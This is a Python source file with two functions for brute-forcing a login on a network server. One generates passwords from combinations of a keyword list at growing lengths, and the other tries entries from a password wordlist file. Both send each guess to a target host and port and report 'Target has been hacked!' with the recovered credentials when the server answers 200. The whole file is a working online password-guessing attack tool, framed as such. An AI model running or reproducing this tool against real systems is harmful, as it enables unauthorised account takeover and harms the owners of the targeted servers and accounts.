
def brute_by_target_info(keyword_list,
                         query,
                         query_settings_dict,
                         difficulty_start_index_target_info=0,
                         difficulty_end_index_target_info=2,
                         iter_number=0
                         ):
    server_login = query_settings_dict['server_login']
    net_protocol = query_settings_dict['net_protocol']
    net_node = query_settings_dict['net_node']
    net_port = query_settings_dict['net_port']
    net_path = query_settings_dict['net_path']
    keyword_list.reverse()
    keyword_list_base = len(keyword_list)
    attempt_number = 0
    while difficulty_start_index_target_info <= difficulty_end_index_target_info:
        attempt_number += 1
        temp = iter_number
        password_target_info = ''
        while temp != 0:
            rest = temp % keyword_list_base
            temp = temp // keyword_list_base
            password_target_info = keyword_list[rest] + password_target_info
        password_target_info = keyword_list[0] * (difficulty_start_index_target_info
                                                  - len(password_target_info)) + password_target_info
        print(f'Attempt №: {attempt_number}    Current difficulty: {difficulty_start_index_target_info}    '
              f'Current password: {password_target_info}')
        status_code = query(net_protocol, net_node, net_port, net_path, server_login, password_target_info)
        if status_code == 200:
            print()
            print('Success! Target has been hacked!')
            print(f'Target login: {server_login}    Target password: {password_target_info}')
            return password_target_info
        else:
            print(f'Status code: {status_code}')
        if keyword_list[-1] * difficulty_start_index_target_info == password_target_info:
            difficulty_start_index_target_info += 1
            iter_number = 0
        else:
            iter_number += 1


def brute_by_password_list(passwords_file, query, query_settings_dict, iter_number=0):
    server_login = query_settings_dict['server_login']
    net_protocol = query_settings_dict['net_protocol']
    net_node = query_settings_dict['net_node']
    net_port = query_settings_dict['net_port']
    net_path = query_settings_dict['net_path']
    attempt_number = 0
    for line in passwords_file:
        attempt_number += 1
        iter_number += 1
        password_from_list = line.strip()
        print(f'Attempt №: {attempt_number}    Current password: {password_from_list}')
        status_code = query(net_protocol, net_node, net_port, net_path, server_login, password_from_list)
        if status_code == 200:
            print()
            print('Success! Target has been hacked!')
            print(f'Target login: {server_login}    Target password: {password_from_list}')
            return password_from_list
        else:
            print(f'Status code: {status_code}')
